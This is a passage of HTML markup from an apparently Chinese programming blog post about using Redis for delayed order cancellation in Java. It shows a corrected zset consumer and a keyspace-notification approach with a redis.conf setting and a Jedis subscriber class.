class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:redis消费了一个任务：消费的订单OrderId为\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358e0553458802-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>修改为</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358e3631787860\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif(nowSecond &gt;= score){\r\n    String orderId = ((Tuple)items.toArray()[0]).getElement();\r\n    Long num = jedis.zrem(\"OrderId\", orderId);\r\n    if( num != null &amp;&amp; num&gt;0){\r\n        System.out.println(System.currentTimeMillis()+\"ms:redis消费了一个任务：消费的订单OrderId为\"+orderId);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e3631787860-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358e3631787860-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e3631787860-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358e3631787860-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e3631787860-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358e3631787860-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e3631787860-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358e3631787860-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nowSecond</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358e3631787860-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Tuple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">items</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">toArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getElement</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358e3631787860-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">Long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">zrem</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"OrderId\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358e3631787860-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">num</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358e3631787860-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:redis消费了一个任务：消费的订单OrderId为\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358e3631787860-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358e3631787860-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>在这种修改后，重新运行ThreadTest类，发现输出正常了</p>\n<h4 id=\"思路二\">思路二</h4>\n<p>该方案使用redis的Keyspace Notifications，中文翻译就是<a href=\"https://redis.io/topics/notifications\">键空间机制</a>，就是利用该机制可以在key失效之后，提供一个回调，实际上是redis会给客户端发送一个消息。是需要redis版本2.8以上。</p>\n<h4 id=\"实现二\">实现二</h4>\n<p>在redis.conf中，加入一条配置</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358e7906604249\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnotify-keyspace-events Ex</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358e7906604249-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358e7906604249-1\"><span class=\"crayon-v\">notify</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">keyspace</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">events </span><span class=\"crayon-v\">Ex</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>运行代码如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358ea177746052\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay5;\r\n\r\nimport redis.clients.jedis.Jedis;\r\nimport redis.clients.jedis.JedisPool;\r\nimport redis.clients.jedis.JedisPubSub;\r\n\r\npublic class RedisTest {\r\n    private static final String ADDR = \"127.0.0.1\";\r\n    private static final int PORT = 6379;\r\n    private static JedisPool jedis = new JedisPool(ADDR, PORT);\r\n    private static RedisSub sub = new RedisSub();\r\n\r\n    public static void init() {\r\n        new Thread(new Runnable() {\r\n            public void run() {\r\n                jedis.getResource().subscribe(sub, \"__keyevent@0__:expired\");\r\n            }\r\n        }).start();\r\n    }\r\n\r\n    public static void main(String[] args) throws InterruptedException {\r\n        init();\r\n        for(int i =0;i&lt;10;i++){\r\n            String orderId = \"OID000000\"+i;\r\n            jedis.getResource().setex(orderId, 3, orderId);\r\n            System.out.println(System.currentTimeMillis()+\"ms:\"+orderId+\"订单生成\");\r\n        }\r\n    }\r\n    \r\n    static class RedisSub extends JedisPubSub {\r\n        &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n        public void onMessage(String channel, String message) {\r\n            System.out.println(System.currentTimeMillis()+\"ms:\"+message+\"订单取消\");\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ea177746052-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ea177746052-36\">36</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay5</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Jedis</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JedisPool</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">clients</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JedisPubSub</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-7\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ADDR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"127.0.0.1\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PORT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ADDR</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PORT</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisSub </span><span class=\"crayon-v\">sub</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisSub</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-12\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Thread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Runnable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-16\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">subscribe</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"__keyevent@0__:expired\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">start</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-20\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">InterruptedException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"OID000000\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setex</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-26\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">currentTimeMillis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"ms:\"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"订单生成\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ea177746052-29\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ea177746052-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisSub</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">extends</span><span 